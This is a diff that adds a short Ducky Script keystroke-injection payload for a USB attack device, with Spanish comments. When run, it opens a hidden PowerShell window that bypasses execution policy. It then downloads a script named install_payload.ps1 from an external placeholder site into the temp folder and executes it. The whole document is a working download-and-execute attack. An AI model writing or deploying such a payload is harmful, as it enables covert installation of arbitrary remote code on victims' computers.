@@ -1,0 +1,14 @@
+DELAY 2000
+REM Abre PowerShell como administrador
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile
+ENTER
+DELAY 1000
+
+REM Descarga y ejecuta el script desde una URL externa
+STRING iwr -uri "https://tusitio.com/install_payload.ps1" -OutFile "$env:TEMP\install_payload.ps1"
+ENTER
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\install_payload.ps1"
+ENTER
